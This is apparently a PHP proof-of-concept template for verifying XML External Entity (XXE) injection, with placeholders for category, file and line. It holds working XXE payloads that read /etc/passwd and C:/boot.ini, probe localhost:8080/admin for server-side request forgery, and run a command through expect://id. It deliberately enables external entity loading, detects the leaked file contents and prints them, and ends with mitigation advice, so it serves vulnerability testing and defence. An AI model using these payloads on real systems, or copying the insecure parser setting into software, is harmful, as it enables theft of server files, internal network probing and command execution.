<?php
/**
 * PoC Template: XML External Entity (XXE) Injection
 * 
 * Vulnerability: XML parser with external entity processing enabled
 * Common in: WordPress XML-RPC, REST API, import/export features
 * 
 * Detection: Look for simplexml_load_*(), DOMDocument::loadXML() with libxml_disable_entity_loader(false)
 * 
 * Metadata:
 * - Category: {{CATEGORY}}
 * - Severity: {{SEVERITY}}
 * - File: {{FILE}}
 * - Line: {{LINE}}
 */

// VULNERABLE CODE LOCATION
// {{VULNERABLE_CODE}}

echo "=== XML External Entity (XXE) PoC ===\n\n";

// Step 1: Test payloads for different scenarios
$xxe_payloads = [
    'file_read' => [
        'name' => 'File Read (/etc/passwd)',
        'xml' => <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
XML
    ],
    'file_read_windows' => [
        'name' => 'File Read (Windows C:\\boot.ini)',
        'xml' => <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///C:/boot.ini">
]>
<root>
  <data>&xxe;</data>
</root>
XML
    ],
    'internal_port_scan' => [
        'name' => 'Internal Port Scan (SSRF)',
        'xml' => <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<root>
  <data>&xxe;</data>
</root>
XML
    ],
    'php_wrapper' => [
        'name' => 'PHP Wrapper (expect://id)',
        'xml' => <<<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<root>
  <data>&xxe;</data>
</root>
XML
    ]
];

$xxe_confirmed = false;
$successful_payload = '';
$leaked_data = '';

// Step 2: Test each payload
foreach ($xxe_payloads as $type => $payload_info) {
    echo "[*] Testing: {$payload_info['name']}\n";
    
    // VULNERABILITY: libxml_disable_entity_loader(false) enables XXE
    $previous_setting = libxml_disable_entity_loader(false);
    
    // Suppress errors to avoid XML parsing warnings
    libxml_use_internal_errors(true);
    
    try {
        // Parse XML with external entities enabled
        $xml = simplexml_load_string($payload_info['xml']);
        
        if ($xml && isset($xml->data)) {
            $content = (string)$xml->data;
            
            // Check if we successfully read sensitive data
            if (!empty($content)) {
                // Linux /etc/passwd signature
                if (strpos($content, 'root:') !== false || strpos($content, '/bin/') !== false) {
                    $xxe_confirmed = true;
                    $successful_payload = $type;
                    $leaked_data = $content;
                    echo "[✓] XXE successful! Leaked data detected.\n\n";
                    break;
                }
                
                // Windows boot.ini signature
                if (strpos($content, '[boot loader]') !== false || strpos($content, 'operating systems') !== false) {
                    $xxe_confirmed = true;
                    $successful_payload = $type;
                    $leaked_data = $content;
                    echo "[✓] XXE successful! Leaked data detected.\n\n";
                    break;
                }
                
                // Any non-empty response from SSRF
                if (strlen($content) > 10 && $type === 'internal_port_scan') {
                    $xxe_confirmed = true;
                    $successful_payload = $type;
                    $leaked_data = $content;
                    echo "[✓] XXE/SSRF successful! Internal service response detected.\n\n";
                    break;
                }
            }
        }
        
    } catch (Exception $e) {
        echo "[!] Error: " . $e->getMessage() . "\n";
    }
    
    // Restore previous setting
    libxml_disable_entity_loader($previous_setting);
    libxml_clear_errors();
    
    echo "[-] No XXE detected for this payload\n\n";
}

// Step 3: Verify and report
if ($xxe_confirmed) {
    echo "=== VERIFICATION ===\n";
    echo "[✓] XXE CONFIRMED\n";
    echo "[✓] Successful payload: $successful_payload\n";
    echo "[✓] Leaked data length: " . strlen($leaked_data) . " bytes\n\n";
    
    echo "=== LEAKED DATA (First 300 chars) ===\n";
    echo substr($leaked_data, 0, 300);
    if (strlen($leaked_data) > 300) {
        echo "\n... (truncated)";
    }
    echo "\n\n";
    
    echo "=== IMPACT ===\n";
    echo "- Arbitrary file read from server filesystem\n";
    echo "- Internal network reconnaissance (SSRF)\n";
    echo "- Potential DoS via billion laughs attack\n";
    echo "- Can leak sensitive configuration files, credentials\n\n";
    
    echo "=== RECOMMENDATION ===\n";
    echo "1. Always use libxml_disable_entity_loader(true)\n";
    echo "2. Disable DOCTYPE declarations in XML input\n";
    echo "3. Use JSON instead of XML where possible\n";
    echo "4. Implement XML input validation and sanitization\n";
    echo "5. Audit all XML parsing: simplexml_load_*(), DOMDocument, XMLReader\n";
    
    exit(0); // SUCCESS
    
} else {
    echo "\n[✗] XXE verification failed\n";
    echo "[✗] No external entity processing detected\n";
    echo "[i] Server may have XXE protection enabled (libxml_disable_entity_loader=true)\n";
    exit(1); // FAILURE
}
?>
